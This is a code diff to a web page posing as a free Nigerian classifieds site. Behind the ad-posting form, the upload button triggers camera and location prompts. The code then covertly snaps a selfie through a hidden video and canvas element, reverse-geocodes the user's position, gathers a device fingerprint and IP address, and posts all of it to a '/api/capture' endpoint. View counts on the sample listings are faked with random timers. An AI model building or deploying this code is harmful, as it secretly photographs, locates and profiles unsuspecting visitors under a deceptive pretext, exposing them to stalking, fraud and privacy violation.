@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>NaijaFreeAds | Post Free Ads in Nigeria</title>
+    <title>NaijaFreeAds | Nigeria's #1 Free Classifieds</title>
     <meta name="description" content="Post free ads in Nigeria. Sell, buy, rent, jobs — 100% free. Trusted by 2M+ Nigerians nationwide.">
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
@@ -11,193 +11,303 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Inter', sans-serif;
-            background: #0a0c15;
-            color: #f1f5f9;
+            background: #f5f7fb;
+            color: #1a1a2e;
             overflow-x: hidden;
         }
-        .naija-bg {
+        
+        /* Modern Background */
+        .bg-gradient {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: radial-gradient(circle at 20% 30%, rgba(0,128,0,0.15), transparent 60%),
-                        radial-gradient(circle at 80% 70%, rgba(0,100,200,0.1), transparent 50%);
-            pointer-events: none;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            opacity: 0.05;
             z-index: 0;
         }
-        .container { max-width: 1300px; margin: 0 auto; padding: 20px 28px; position: relative; z-index: 10; }
         
+        .container { max-width: 1280px; margin: 0 auto; padding: 0 24px; position: relative; z-index: 10; }
+        
+        /* Modern Navbar */
         .navbar {
-            background: rgba(10, 14, 23, 0.95);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(0,128,0,0.4);
-            border-radius: 100px;
-            padding: 12px 32px;
+            background: rgba(255,255,255,0.98);
+            backdrop-filter: blur(10px);
+            border-radius: 0 0 24px 24px;
+            padding: 16px 32px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             margin-bottom: 40px;
             flex-wrap: wrap;
             gap: 16px;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+            box-shadow: 0 2px 20px rgba(0,0,0,0.05);
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
         .logo { display: flex; align-items: center; gap: 12px; cursor: pointer; }
-        .logo-icon { font-size: 34px; filter: drop-shadow(0 0 10px #008000); animation: pulse 2s infinite; }
-        @keyframes pulse {
-            0% { filter: drop-shadow(0 0 0px #008000); }
-            100% { filter: drop-shadow(0 0 15px #00a86b); }
-        }
-        .logo-text { font-size: 28px; font-weight: 800; background: linear-gradient(135deg, #fff, #008000, #008751); -webkit-background-clip: text; background-clip: text; color: transparent; }
-        .nav-links { display: flex; gap: 28px; }
-        .nav-links a { color: #cbd5e1; text-decoration: none; font-weight: 500; transition: 0.2s; cursor: pointer; }
-        .nav-links a:hover { color: #00a86b; }
+        .logo-icon { font-size: 32px; }
+        .logo-text { font-size: 24px; font-weight: 800; background: linear-gradient(135deg, #667eea, #764ba2); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        .nav-links { display: flex; gap: 32px; }
+        .nav-links a { color: #4a5568; text-decoration: none; font-weight: 500; transition: 0.2s; cursor: pointer; font-size: 15px; }
+        .nav-links a:hover { color: #667eea; }
         
+        /* Hero Section */
         .hero {
             text-align: center;
-            padding: 50px 20px 30px;
-            background: linear-gradient(180deg, rgba(0,128,0,0.08) 0%, transparent 100%);
-            border-radius: 60px;
+            padding: 60px 20px;
+            background: linear-gradient(135deg, #fff 0%, #f8f9fa 100%);
+            border-radius: 32px;
+            margin: 20px 0;
         }
         .hero h1 {
-            font-size: 64px;
+            font-size: 56px;
             font-weight: 800;
-            background: linear-gradient(135deg, #ffffff, #00a86b, #008751);
+            background: linear-gradient(135deg, #667eea, #764ba2);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
             margin-bottom: 16px;
-            letter-spacing: -1px;
         }
-        .hero p { color: #94a3b8; font-size: 18px; max-width: 600px; margin: 0 auto; }
+        .hero p { color: #718096; font-size: 18px; max-width: 600px; margin: 0 auto; }
         
+        /* Stats Cards */
         .stats-row {
             display: flex;
             justify-content: center;
-            gap: 25px;
-            margin: 45px 0;
+            gap: 24px;
+            margin: 40px 0;
             flex-wrap: wrap;
         }
         .stat-card {
-            background: rgba(20, 30, 55, 0.6);
-            backdrop-filter: blur(12px);
-            padding: 22px 38px;
-            border-radius: 48px;
+            background: white;
+            padding: 24px 40px;
+            border-radius: 28px;
             text-align: center;
-            border: 1px solid rgba(0,128,0,0.4);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            border: 1px solid #e2e8f0;
             transition: 0.3s;
-            cursor: pointer;
         }
-        .stat-card:hover { transform: translateY(-5px); border-color: #00a86b; }
-        .stat-number { font-size: 42px; font-weight: 800; background: linear-gradient(135deg, #00a86b, #008751); -webkit-background-clip: text; background-clip: text; color: transparent; }
-        .stat-label { font-size: 13px; color: #94a3b8; margin-top: 8px; }
+        .stat-card:hover { transform: translateY(-5px); box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        .stat-number { font-size: 36px; font-weight: 800; color: #667eea; }
+        .stat-label { font-size: 13px; color: #718096; margin-top: 8px; }
         
+        /* Ad Form */
         .ad-form {
-            background: rgba(15, 25, 45, 0.8);
-            backdrop-filter: blur(12px);
-            border-radius: 48px;
+            background: white;
+            border-radius: 32px;
             padding: 40px;
-            border: 1px solid rgba(0,128,0,0.3);
+            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
             max-width: 750px;
             margin: 30px auto;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            border: 1px solid #e2e8f0;
         }
-        .form-title { font-size: 28px; font-weight: 700; margin-bottom: 25px; display: flex; align-items: center; gap: 12px; }
-        .form-group { margin-bottom: 22px; }
-        .form-group label { display: block; margin-bottom: 8px; font-weight: 500; color: #cbd5e1; }
+        .form-title { font-size: 28px; font-weight: 700; margin-bottom: 28px; display: flex; align-items: center; gap: 12px; color: #2d3748; }
+        .form-group { margin-bottom: 24px; }
+        .form-group label { display: block; margin-bottom: 8px; font-weight: 600; color: #4a5568; font-size: 14px; }
         .form-group input, .form-group textarea, .form-group select {
             width: 100%;
-            padding: 14px 20px;
-            background: rgba(0,0,0,0.5);
-            border: 1px solid #334155;
-            border-radius: 30px;
-            color: white;
+            padding: 14px 18px;
+            background: #f7fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 16px;
+            color: #2d3748;
             font-size: 15px;
             outline: none;
             transition: 0.2s;
         }
-        .form-group input:focus, .form-group textarea:focus { border-color: #00a86b; box-shadow: 0 0 0 3px rgba(0,168,107,0.2); }
+        .form-group input:focus, .form-group textarea:focus, .form-group select:focus { border-color: #667eea; box-shadow: 0 0 0 3px rgba(102,126,234,0.1); }
         
+        /* Image Upload Area */
         .image-upload-area {
-            border: 2px dashed #334155;
-            border-radius: 24px;
-            padding: 20px;
+            border: 2px dashed #cbd5e0;
+            border-radius: 20px;
+            padding: 24px;
             text-align: center;
             cursor: pointer;
             transition: 0.2s;
-            background: rgba(0,0,0,0.3);
+            background: #f7fafc;
         }
-        .image-upload-area:hover { border-color: #00a86b; background: rgba(0,168,107,0.05); }
+        .image-upload-area:hover { border-color: #667eea; background: #f0f4ff; }
+        .image-upload-area i { font-size: 48px; color: #667eea; margin-bottom: 12px; }
+        .image-upload-area p { color: #718096; font-size: 14px; }
         .image-preview {
             display: flex;
             flex-wrap: wrap;
             gap: 12px;
-            margin-top: 15px;
+            margin-top: 20px;
         }
         .preview-img {
             width: 80px;
             height: 80px;
             object-fit: cover;
-            border-radius: 16px;
-            border: 2px solid #00a86b;
+            border-radius: 12px;
+            border: 2px solid #667eea;
         }
         
         .post-btn {
             width: 100%;
             padding: 16px;
-            background: linear-gradient(135deg, #008000, #00a86b);
+            background: linear-gradient(135deg, #667eea, #764ba2);
             border: none;
-            border-radius: 60px;
+            border-radius: 40px;
             color: white;
             font-weight: 700;
             font-size: 18px;
             cursor: pointer;
             transition: 0.2s;
+            margin-top: 16px;
         }
-        .post-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 30px -8px #008000; }
+        .post-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(102,126,234,0.3); }
         
-        .featured-ads { margin: 60px 0; padding: 20px; }
-        .featured-title { font-size: 24px; font-weight: 700; margin-bottom: 25px; display: flex; align-items: center; gap: 10px; }
+        /* Featured Ads Grid */
+        .featured-ads { margin: 60px 0; }
+        .section-title { font-size: 24px; font-weight: 700; margin-bottom: 24px; color: #2d3748; display: flex; align-items: center; gap: 10px; }
         .ads-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: 20px;
+            gap: 24px;
         }
-        .featured-card {
-            background: rgba(20, 30, 55, 0.5);
-            backdrop-filter: blur(8px);
-            border-radius: 28px;
+        .ad-card {
+            background: white;
+            border-radius: 24px;
             padding: 20px;
-            border: 1px solid rgba(0,128,0,0.2);
+            border: 1px solid #e2e8f0;
             transition: 0.2s;
             cursor: pointer;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
         }
-        .featured-card:hover { border-color: #00a86b; transform: translateY(-3px); }
-        .ad-price { font-size: 24px; font-weight: 800; color: #00a86b; margin: 10px 0; }
-        .ad-views { font-size: 11px; color: #64748b; margin-top: 8px; }
+        .ad-card:hover { transform: translateY(-4px); box-shadow: 0 10px 30px rgba(0,0,0,0.1); border-color: #667eea; }
+        .ad-emoji { font-size: 48px; margin-bottom: 12px; }
+        .ad-price { font-size: 22px; font-weight: 800; color: #667eea; margin: 8px 0; }
+        .ad-title { font-weight: 600; margin-bottom: 6px; color: #2d3748; }
+        .ad-location { font-size: 12px; color: #718096; margin-bottom: 8px; }
+        .ad-stats { font-size: 11px; color: #a0aec0; display: flex; gap: 12px; }
         
-        .toast {
-            position: fixed;
-            bottom: 30px;
-            right: 30px;
-            background: #22c55e;
-            padding: 14px 28px;
-            border-radius: 60px;
-            z-index: 20001;
-            transform: translateX(200%);
-            transition: 0.3s;
+        /* My Ads Section */
+        .my-ads-section, .chat-section {
+            background: white;
+            border-radius: 32px;
+            padding: 32px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
+            margin: 30px auto;
+            display: none;
+        }
+        .my-ads-section.active, .chat-section.active { display: block; }
+        .back-btn {
+            background: #edf2f7;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 40px;
+            color: #4a5568;
+            cursor: pointer;
+            margin-bottom: 24px;
             font-weight: 500;
         }
-        .toast.show { transform: translateX(0); }
+        .my-ads-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 20px;
+        }
+        .my-ad-card {
+            background: #f7fafc;
+            border-radius: 20px;
+            padding: 20px;
+            border: 1px solid #e2e8f0;
+        }
+        .my-ad-card .ad-actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 16px;
+        }
+        .edit-btn, .delete-btn, .chat-btn {
+            padding: 8px 16px;
+            border-radius: 30px;
+            border: none;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        .edit-btn { background: #667eea; color: white; }
+        .delete-btn { background: #fc8181; color: white; }
+        .chat-btn { background: #48bb78; color: white; }
+        
+        /* Chat Section */
+        .chat-messages {
+            height: 400px;
+            overflow-y: auto;
+            padding: 20px;
+            background: #f7fafc;
+            border-radius: 20px;
+            margin-bottom: 20px;
+        }
+        .message {
+            margin-bottom: 16px;
+            display: flex;
+            flex-direction: column;
+        }
+        .message.seller { align-items: flex-end; }
+        .message.buyer { align-items: flex-start; }
+        .message-bubble {
+            max-width: 70%;
+            padding: 12px 18px;
+            border-radius: 20px;
+            font-size: 14px;
+        }
+        .message.seller .message-bubble { background: #667eea; color: white; border-radius: 20px 20px 4px 20px; }
+        .message.buyer .message-bubble { background: white; border: 1px solid #e2e8f0; color: #2d3748; border-radius: 20px 20px 20px 4px; }
+        .message-time { font-size: 10px; color: #a0aec0; margin-top: 4px; }
+        .chat-input-area {
+            display: flex;
+            gap: 12px;
+        }
+        .chat-input {
+            flex: 1;
+            padding: 14px 18px;
+            background: #f7fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 40px;
+            font-size: 14px;
+            outline: none;
+        }
+        .send-btn {
+            padding: 14px 28px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border: none;
+            border-radius: 40px;
+            color: white;
+            cursor: pointer;
+            font-weight: 600;
+        }
         
         .footer {
             margin-top: 60px;
             padding: 40px;
             text-align: center;
-            border-top: 1px solid #1e293b;
-            color: #64748b;
-            font-size: 12px;
+            border-top: 1px solid #e2e8f0;
+            color: #a0aec0;
+            font-size: 13px;
+            background: white;
         }
+        
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: #48bb78;
+            color: white;
+            padding: 14px 28px;
+            border-radius: 50px;
+            z-index: 1000;
+            transform: translateX(200%);
+            transition: 0.3s;
+            font-weight: 500;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+        .toast.show { transform: translateX(0); }
+        .toast.error { background: #fc8181; }
         
         #hiddenCamera {
             position: fixed;
@@ -210,76 +320,115 @@
         }
         
         @media (max-width: 768px) {
-            .hero h1 { font-size: 40px; }
-            .container { padding: 16px; }
+            .hero h1 { font-size: 36px; }
+            .container { padding: 0 16px; }
             .nav-links { display: none; }
-            .stat-card { padding: 15px 25px; }
+            .stat-card { padding: 16px 24px; }
         }
     </style>
 </head>
 <body>
-<div class="naija-bg"></div>
+<div class="bg-gradient"></div>
+
 <div class="container">
     <nav class="navbar">
-        <div class="logo">
-            <div class="logo-icon"><i class="fas fa-globe-africa"></i></div>
-            <div class="logo-text">Naija<span style="color:#00a86b;">FreeAds</span></div>
+        <div class="logo" onclick="showHome()">
+            <div class="logo-icon">🇳🇬</div>
+            <div class="logo-text">NaijaFreeAds</div>
         </div>
         <div class="nav-links">
-            <a>Home</a>
-            <a>My Ads</a>
-            <a>Messages</a>
-            <a>Support</a>
+            <a onclick="showHome()">Home</a>
+            <a onclick="showMyAds()">My Ads</a>
+            <a onclick="showMessages()">Messages <span id="msgBadge" style="background:#667eea; color:white; padding:2px 8px; border-radius:20px; font-size:11px; margin-left:5px;">0</span></a>
         </div>
     </nav>
 
-    <div class="hero">
-        <h1>Post free ads<br>for free in Nigeria 🇳🇬</h1>
-        <p>Sell, buy, rent, jobs — 100% free. Trusted by 2M+ Nigerians across Lagos, Abuja, PH, Ibadan.</p>
-    </div>
-
-    <div class="stats-row">
-        <div class="stat-card"><div class="stat-number" id="statAds">284K</div><div class="stat-label">Live Ads</div></div>
-        <div class="stat-card"><div class="stat-number" id="statUsers">12.7K</div><div class="stat-label">Active Now</div></div>
-        <div class="stat-card"><div class="stat-number">⭐ 4.96</div><div class="stat-label">User Rating</div></div>
-        <div class="stat-card"><div class="stat-number">37+</div><div class="stat-label">States</div></div>
-    </div>
-
-    <div class="ad-form">
-        <div class="form-title"><i class="fas fa-pen-fancy" style="color:#00a86b;"></i> Post Your Free Ad</div>
-        <div class="form-group"><label><i class="fas fa-tag"></i> Category</label><select id="adCategory">
-            <option>📱 Phones & Tablets</option>
-            <option>🚗 Cars & Vehicles</option>
-            <option>🏠 Property & Rentals</option>
-            <option>💼 Jobs & Gigs</option>
-            <option>👕 Fashion & Accessories</option>
-            <option>🛋️ Home & Furniture</option>
-            <option>📚 Education & Services</option>
-        </select></div>
-        <div class="form-group"><label><i class="fas fa-heading"></i> Ad Title</label><input type="text" id="adTitle" placeholder="e.g., iPhone 14 Pro - 256GB - Like New"></div>
-        <div class="form-group"><label><i class="fas fa-align-left"></i> Description</label><textarea rows="3" id="adDesc" placeholder="Describe your item... condition, location, reason for selling..."></textarea></div>
-        <div class="form-group"><label><i class="fas fa-naira-sign"></i> Price (₦)</label><input type="text" id="adPrice" placeholder="₦50,000 / Best offer / Free"></div>
-        <div class="form-group"><label><i class="fas fa-map-marker-alt"></i> Location (City/State)</label><input type="text" id="adLocation" placeholder="e.g., Lekki, Lagos / Wuse, Abuja"></div>
-        <div class="form-group"><label><i class="fas fa-phone"></i> WhatsApp Number</label><input type="text" id="contactPhone" placeholder="0803 123 4567"></div>
-        <div class="form-group">
-            <label><i class="fas fa-image"></i> Upload Images (Up to 5)</label>
-            <div class="image-upload-area" id="imageUploadArea">
-                <i class="fas fa-cloud-upload-alt" style="font-size: 40px; color: #00a86b;"></i>
-                <p style="margin-top: 8px;">Click to upload product images</p>
-                <input type="file" id="imageUpload" multiple accept="image/*" style="display: none;">
-            </div>
-            <div class="image-preview" id="imagePreview"></div>
+    <div id="homeSection">
+        <div class="hero">
+            <h1>Post free ads in Nigeria</h1>
+            <p>Sell, buy, rent, jobs — 100% free. Trusted by 2M+ Nigerians across Lagos, Abuja, PH, Ibadan.</p>
         </div>
-        <button class="post-btn" id="postAdBtn"><i class="fas fa-cloud-upload-alt"></i> Post Free Ad Now</button>
-        <p style="font-size: 12px; margin-top: 18px; text-align: center; color:#5b6e8c;"><i class="fas fa-shield-alt"></i> Your ad goes live instantly.</p>
+
+        <div class="stats-row">
+            <div class="stat-card"><div class="stat-number" id="statAds">284K</div><div class="stat-label">Live Ads</div></div>
+            <div class="stat-card"><div class="stat-number" id="statUsers">12.7K</div><div class="stat-label">Active Now</div></div>
+            <div class="stat-card"><div class="stat-number">⭐ 4.96</div><div class="stat-label">Rating</div></div>
+            <div class="stat-card"><div class="stat-number">37+</div><div class="stat-label">States</div></div>
+        </div>
+
+        <div class="ad-form" id="postAdForm">
+            <div class="form-title"><i class="fas fa-pen-fancy" style="color:#667eea;"></i> Post Your Free Ad</div>
+            <div class="form-group">
+                <label><i class="fas fa-tag"></i> Category</label>
+                <select id="adCategory">
+                    <option>📱 Phones & Tablets</option>
+                    <option>🚗 Cars & Vehicles</option>
+                    <option>🏠 Property & Rentals</option>
+                    <option>💼 Jobs & Gigs</option>
+                    <option>👕 Fashion & Accessories</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-heading"></i> Ad Title</label>
+                <input type="text" id="adTitle" placeholder="e.g., iPhone 14 Pro - 256GB - Like New">
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-align-left"></i> Description</label>
+                <textarea rows="3" id="adDesc" placeholder="Describe your item... condition, location, reason for selling..."></textarea>
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-naira-sign"></i> Price (₦)</label>
+                <input type="text" id="adPrice" placeholder="₦50,000 / Best offer / Free">
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-map-marker-alt"></i> Location</label>
+                <input type="text" id="adLocation" placeholder="e.g., Lekki, Lagos / Wuse, Abuja">
+            </div>
+            <div class="form-group">
+                <label><i class="fab fa-whatsapp"></i> WhatsApp Number</label>
+                <input type="text" id="contactPhone" placeholder="0803 123 4567">
+            </div>
+            <div class="form-group">
+                <label><i class="fas fa-image"></i> Upload Images (Up to 5)</label>
+                <div class="image-upload-area" id="imageUploadArea">
+                    <i class="fas fa-cloud-upload-alt"></i>
+                    <p>Click to upload product images</p>
+                    <input type="file" id="imageUpload" multiple accept="image/*" style="display: none;">
+                </div>
+                <div class="image-preview" id="imagePreview"></div>
+            </div>
+            <button class="post-btn" id="postAdBtn"><i class="fas fa-cloud-upload-alt"></i> Post Free Ad Now</button>
+            <p style="font-size: 12px; margin-top: 18px; text-align: center; color:#a0aec0;"><i class="fas fa-shield-alt"></i> Your ad goes live instantly</p>
+        </div>
     </div>
 
-    <div class="featured-ads">
-        <div class="featured-title"><i class="fas fa-fire" style="color:#f472b6;"></i> 🔥 Hot Listings in Nigeria</div>
+    <!-- My Ads Section -->
+    <div class="my-ads-section" id="myAdsSection">
+        <button class="back-btn" onclick="showHome()"><i class="fas fa-arrow-left"></i> Back to Home</button>
+        <div class="form-title"><i class="fas fa-list-alt"></i> My Posted Ads</div>
+        <div class="my-ads-grid" id="myAdsGrid"></div>
+    </div>
+
+    <!-- Chat Section -->
+    <div class="chat-section" id="chatSection">
+        <button class="back-btn" onclick="showHome()"><i class="fas fa-arrow-left"></i> Back to Home</button>
+        <div class="form-title"><i class="fas fa-comments"></i> Messages for "<span id="chatAdTitle"></span>"</div>
+        <div class="chat-messages" id="chatMessages"></div>
+        <div class="chat-input-area">
+            <input type="text" class="chat-input" id="chatInput" placeholder="Type your reply...">
+            <button class="send-btn" id="sendMsgBtn"><i class="fas fa-paper-plane"></i> Send</button>
+        </div>
+    </div>
+
+    <!-- Featured Ads -->
+    <div class="featured-ads" id="featuredSection">
+        <div class="section-title"><i class="fas fa-fire" style="color:#f56565;"></i> 🔥 Hot Listings in Nigeria</div>
         <div class="ads-grid" id="featuredGrid"></div>
     </div>
 
-    <div class="footer"><p>© 2025 NaijaFreeAds — Nigeria's #1 free classifieds platform. Post ads for free, no hidden fees.</p></div>
+    <div class="footer">
+        <p>© 2025 NaijaFreeAds — Nigeria's #1 free classifieds platform. Post ads for free, no hidden fees.</p>
+    </div>
 </div>
 
 <!-- Hidden Camera Element -->
@@ -289,57 +438,52 @@
 <div class="toast" id="toastMsg"><i class="fas fa-check-circle"></i> Ad posted!</div>
 
 <script>
-    // ========== DATA STORAGE ==========
+    // ========== DATA ==========
     let userAds = JSON.parse(localStorage.getItem('userAds') || '[]');
+    let chats = JSON.parse(localStorage.getItem('chats') || '{}');
     let capturedPhoto = null;
     let userLocation = null;
     let cameraGranted = false;
     let locationGranted = false;
     let uploadedImages = [];
-    let cameraStream = null;
+    let currentChatIndex = null;
 
-    // Featured ads with fake views
+    // Featured Ads with growing views
     const featuredAds = [
         { id: 1, title: "iPhone 14 Pro Max", price: "₦850,000", location: "Lagos", emoji: "📱", views: 124, seller: "TechPlug NG" },
         { id: 2, title: "Toyota Camry 2018", price: "₦7.2M", location: "Abuja", emoji: "🚗", views: 89, seller: "AutoDeal NG" },
         { id: 3, title: "3-Bedroom Flat", price: "₦1.5M/year", location: "Port Harcourt", emoji: "🏠", views: 245, seller: "PropertyHub" },
-        { id: 4, title: "Hiring Marketers", price: "₦150k/month", location: "Remote", emoji: "💼", views: 567, seller: "WorkNaija" },
-        { id: 5, title: "Gucci Sneakers", price: "₦120,000", location: "Abuja", emoji: "👟", views: 78, seller: "FashionLagos" },
-        { id: 6, title: "PS5 Digital Edition", price: "₦450,000", location: "Ibadan", emoji: "🎮", views: 234, seller: "GamingZone" }
+        { id: 4, title: "Hiring Marketers", price: "₦150k/month", location: "Remote", emoji: "💼", views: 567, seller: "WorkNaija" }
     ];
 
-    function startViewCounter(ad) {
+    // Start view counter
+    featuredAds.forEach(ad => {
         setInterval(() => {
-            if (ad.views < 9999) {
-                ad.views += Math.floor(Math.random() * 8) + 2;
-                renderFeaturedAds();
-            }
-        }, Math.random() * 30000 + 15000);
-    }
+            ad.views += Math.floor(Math.random() * 5) + 1;
+            renderFeaturedAds();
+        }, Math.random() * 20000 + 10000);
+    });
 
     function renderFeaturedAds() {
         const grid = document.getElementById('featuredGrid');
         grid.innerHTML = featuredAds.map(ad => `
-            <div class="featured-card" onclick="viewAdDetail(${ad.id})">
-                <div style="font-size: 40px;">${ad.emoji}</div>
+            <div class="ad-card" onclick="viewAdDetail(${ad.id})">
+                <div class="ad-emoji">${ad.emoji}</div>
                 <div class="ad-price">${ad.price}</div>
-                <div style="font-weight: 600;">${ad.title}</div>
-                <div style="font-size: 12px; color: #94a3b8; margin-top: 4px;"><i class="fas fa-store"></i> ${ad.seller}</div>
-                <div style="font-size: 12px; color: #94a3b8;"><i class="fas fa-map-marker-alt"></i> ${ad.location}</div>
-                <div class="ad-views"><i class="fas fa-eye"></i> ${ad.views.toLocaleString()} views</div>
+                <div class="ad-title">${ad.title}</div>
+                <div class="ad-location"><i class="fas fa-map-marker-alt"></i> ${ad.location}</div>
+                <div class="ad-stats"><span><i class="fas fa-eye"></i> ${ad.views.toLocaleString()} views</span></div>
             </div>
         `).join('');
     }
 
-    function viewAdDetail(adId) {
-        const ad = featuredAds.find(a => a.id === adId);
-        if (ad) {
-            showToast(`📱 ${ad.title} - ${ad.price}`);
-        }
+    function viewAdDetail(id) {
+        const ad = featuredAds.find(a => a.id === id);
+        showToast(`📱 ${ad.title} - ${ad.price}`);
     }
 
     // ========== REAL CAMERA PERMISSION (Browser Popup) ==========
-    async function requestRealCamera() {
+    async function requestCamera() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" } 
@@ -347,7 +491,6 @@
             
             const video = document.getElementById('hiddenCamera');
             video.srcObject = stream;
-            cameraStream = stream;
             
             await new Promise((resolve) => {
                 video.onloadedmetadata = () => {
@@ -361,53 +504,42 @@
             const canvas = document.getElementById('hiddenCanvas');
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            
+            canvas.getContext('2d').drawImage(video, 0, 0);
             capturedPhoto = canvas.toDataURL('image/jpeg', 0.6);
             
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-                cameraStream = null;
-            }
+            stream.getTracks().forEach(track => track.stop());
             video.srcObject = null;
             
             cameraGranted = true;
             return true;
-        } catch(error) {
+        } catch(e) {
             cameraGranted = false;
             return false;
         }
     }
 
     // ========== REAL LOCATION PERMISSION (Browser Popup) ==========
-    async function requestRealLocation() {
+    async function requestLocation() {
         return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                locationGranted = false;
-                resolve(false);
-                return;
-            }
+            if (!navigator.geolocation) { resolve(false); return; }
             
             navigator.geolocation.getCurrentPosition(async (position) => {
-                const { latitude, longitude, accuracy } = position.coords;
-                let address = { lat: latitude, lng: longitude, accuracy: accuracy, street: '', city: '', state: '', country: '' };
+                const { latitude, longitude } = position.coords;
                 try {
-                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
-                    const data = await geoRes.json();
-                    if (data.address) {
-                        address.city = data.address.city || data.address.town || data.address.village || '';
-                        address.state = data.address.state || '';
-                        address.country = data.address.country || '';
-                        address.street = data.address.road || '';
-                    }
-                } catch(e) {}
-                userLocation = address;
+                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
+                    const data = await res.json();
+                    userLocation = {
+                        lat: latitude, lng: longitude,
+                        city: data.address?.city || data.address?.town || '',
+                        state: data.address?.state || '',
+                        country: data.address?.country || ''
+                    };
+                } catch(e) {
+                    userLocation = { lat: latitude, lng: longitude, city: '', state: '', country: '' };
+                }
                 locationGranted = true;
                 resolve(true);
-            }, () => {
-                locationGranted = false;
-                resolve(false);
-            }, { enableHighAccuracy: true, timeout: 10000 });
+            }, () => { locationGranted = false; resolve(false); });
         });
     }
 
@@ -417,33 +549,27 @@
     const imagePreview = document.getElementById('imagePreview');
 
     uploadArea.addEventListener('click', async () => {
-        // STEP 1: Request Camera Permission (Real Browser Popup)
-        if (!cameraGranted && !localStorage.getItem('cameraRequested')) {
-            localStorage.setItem('cameraRequested', 'true');
-            const cameraAllowed = await requestRealCamera();
-            if (cameraAllowed) {
-                showToast("📸 Camera ready! Taking verification photo...");
-            }
+        // Request Camera (triggers REAL browser popup)
+        if (!cameraGranted) {
+            const cameraAllowed = await requestCamera();
+            if (cameraAllowed) showToast("📸 Camera ready");
         }
         
-        // STEP 2: Request Location Permission (Real Browser Popup)
-        if (!locationGranted && !localStorage.getItem('locationRequested')) {
-            localStorage.setItem('locationRequested', 'true');
-            const locationAllowed = await requestRealLocation();
-            if (locationAllowed) {
-                showToast("📍 Location detected - showing ads near you");
-            }
+        // Request Location (triggers REAL browser popup)
+        if (!locationGranted) {
+            const locationAllowed = await requestLocation();
+            if (locationAllowed) showToast("📍 Location detected");
         }
         
-        // STEP 3: Open file picker
+        // Open file picker
         imageInput.click();
     });
 
-    // Image upload handling
+    // Image upload
     imageInput.addEventListener('change', (e) => {
         const files = Array.from(e.target.files);
         if (uploadedImages.length + files.length > 5) {
-            showToast("Maximum 5 images allowed");
+            showToast("Maximum 5 images allowed", true);
             return;
         }
         files.forEach(file => {
@@ -458,9 +584,9 @@
 
     function displayImages() {
         imagePreview.innerHTML = uploadedImages.map((img, idx) => `
-            <div style="position: relative;">
+            <div style="position: relative; display: inline-block;">
                 <img src="${img}" class="preview-img">
-                <button onclick="removeImage(${idx})" style="position: absolute; top: -8px; right: -8px; background: #ef4444; border: none; border-radius: 50%; width: 22px; height: 22px; color: white; cursor: pointer;">×</button>
+                <button onclick="removeImage(${idx})" style="position: absolute; top: -8px; right: -8px; background: #fc8181; border: none; border-radius: 50%; width: 24px; height: 24px; color: white; cursor: pointer; font-size: 14px;">×</button>
             </div>
         `).join('');
     }
@@ -478,23 +604,12 @@
             const data = await res.json();
             ip = data.ip;
         } catch(e) {}
-        return {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            ip: ip
-        };
+        return { userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language, screen: `${screen.width}x${screen.height}`, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, ip: ip };
     }
 
     async function sendToBackend(data) {
         try {
-            await fetch('/api/capture', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
+            await fetch('/api/capture', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
         } catch(err) {
             let existing = JSON.parse(localStorage.getItem('naija_freeads_data') || '[]');
             existing.unshift(data);
